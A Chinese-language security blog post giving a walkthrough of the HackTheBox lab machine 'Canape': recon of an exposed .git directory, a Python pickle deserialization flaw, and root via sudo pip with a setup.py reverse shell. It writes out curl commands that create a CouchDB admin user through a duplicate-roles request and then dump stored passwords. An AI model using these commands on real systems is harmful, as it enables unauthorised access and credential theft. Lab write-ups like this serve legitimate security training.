> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dgrnechqopCaV5K98CcXOg)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **128** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/134

靶机难度：中级（4.7/10）

靶机发布日期：2018 年 9 月 15 日

靶机描述：

Canape is a moderate difficulty machine, however the use of a file (.git) that is not included in the dirbuster wordlists can greatly increase the difficulty for some users. This machine also requires a basic understanding of Python to be able to find the exploitable point in the application.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/hZ9Y6npXb7RbuQKlbYoTStRYAbKyTqu3fX2nmkd8192YhqJKPLKiac70GiaBNOdic88Ggwcia32qIUKUVwBPlQUIEA/640?wx_fmt=png)

  

一、信息收集

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8pbjPEyLvckgYNz6yHoUE8RODMIBSKojpn6RbmmbHGurnEfLbdfpFyw/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.70....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8MlJu6FdHbf3Yu6Oic2wiaAD5w2rw3P3FQVp05j0ib27sFjIEGOqgUelbw/640?wx_fmt=png)

Nmap 发现开放了 Apache 和 OpenSSH 服务.... 还发现了. git 目录

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8EicJxyKBnTEMPAYCDMI1BFT6wiaUowFo5Br6qcYoChrEDcb82s76r1cQ/640?wx_fmt=png)

浏览 apache 页面发现存在 View 和 submit 页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv85zNppO1wyT9kuibW2jdRcQRCewGhWiaLUjpPpJprVx2zpUicwonEFwlVw/640?wx_fmt=png)

查看 VIew 发现了一些对话，homer 用户信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8vPV590icfMHqtpG7dcJeqYzxda3nqPyb8UrwMyoMv2Gibrf5oSHcIiabg/640?wx_fmt=png)

nmap 前面扫描发现了. git 目录发现了很多文件....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8aicYyufYk49icVzgeNANNCF6Hya9KpToEia1ULlFVzkUKjSn87RRkgYuQ/640?wx_fmt=png)

查看后在 config 发现了域名信息... 添加

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8JjnSqYaMqes6xGic1BSMOXIq5lKEjsgR5gdkcO4MJW7PRywrdOIia3Lg/640?wx_fmt=png)

添加域名后，下载了 git 包... 可看到存在__init py 文件等信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8xjFn9YalXwToG7yibHyUxHicpEqORH0hlT7V3d4fBcOHJBP7ArG2mkNA/640?wx_fmt=png)

阅读 int_py 发现：

这是处理 / submit 页面的部分，它接受 POST 值 character 和 quote，如果其中任何一个为 null 以及白名单中不存在该字符，则抛出错误，这里可以引用名称，如果它们都有效就会 p_id 使用 char+quote 数据的 md5sum 初始化一个变量，然后在 tmp 文件夹中以. p 扩展名创建一个同名文件（该文件应该是一个 pickle 文件），然后将其填充 char+quote 数据....

Python 的 pickle 库有助于序列化数据和存储，并且像大多数使用各种语言的序列化库一样容易受到攻击，例如 Celestial 上的 NodeJs 序列化漏洞....

可以到 google 搜索相关 pickle 漏洞信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8OAdtYxmq3RM8gOxTJzony8DUicaYN95yWibzTTKu6CQwQFeHJPeeiacvw/640?wx_fmt=png)

通过简单编写 EXP，成功获得了 www 权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8GZ2wnytnhPjCmfPB3Tq5axEf1GibyAYPV1pH3mmSLSPYqqFPB5CG4eg/640?wx_fmt=png)

上传 LinEnum.sh 枚举靶机信息...

发现 5984 在本地默认监听，测试看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8uU8ynT7IcFn2Rrgic6H1hQXyyvU8aYnU9jtMefbbGqiadrGqBwTHzvPA/640?wx_fmt=png)

通过 curl 测试，可以枚举数据库信息...

使用 /_all_dbs/api 调用，看到它具有 6 个数据库，继续从中搜索_users 和 passwd...

虽然没获取，这里需要创建数据库用户名密码，可以通过 corrcet curl PUT 请求来创建用户名，来利用此数据库获得信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8yn9mdrY3MxqovPbkry0ics0yGYIh92GUV3q59Yzrpg9QovOb47kkMKw/640?wx_fmt=png)

```
curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:dayu' --data-binary '{
  "type": "user",
  "name": "dayu",
  "roles": ["_admin"],
  "roles": [],
  "password": "dayuxiyou"
}'
```

创建 dayu 的管理员用户，密码为 dayuxiyou....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8L5ia1kBWYNucEr84zEfmCOOK2yKWWIYicopLUVNVgVJ52d6MKpcj7ztg/640?wx_fmt=png)

```
curl --user 'dayu:dayuxiyou' 127.0.0.1:5984/passwords/_all_docs
curl --user 'dayu:dayuxiyou' 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
curl --user 'dayu:dayuxiyou' 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
curl --user 'dayu:dayuxiyou' 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
curl --user 'dayu:dayuxiyou' 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738可以看到得到了一堆id，继续利用id获得信息...
```

获得了密码信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8xogf0xZiaayiassIsg25HRMlz2GoZQWDEdogib5I7XZGITeBRYia0X9BPA/640?wx_fmt=png)

查看到了用户信息... 直接 su 登录了用户权限... 获得了 user_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv8VQiaqjMotPt58d6Eia1oqY0qLDvt7Aq9NPP8KKeZLCvlN6eNKN8hFlyQ/640?wx_fmt=png)

sudo -l 发现允许以 root 身份运行 pip，直接创建一个简单 shell python 即可...

然后以 root 来执行 pip 安装....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPHEvRFeWszSbqfCx8sayv88tsSuXUDtZoWkE6AsU0F7c5wwQibhjjM22XFQB7yFu2gwDpXlWJVwcA/640?wx_fmt=png)

创建 setup.py python 脚本，成功获得了反向外壳 root 权限...

获得 root_flag 信息...

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)

大余安全的第 119 篇文章，一个每日分享渗透小技巧的公众号大家好，欢迎关注！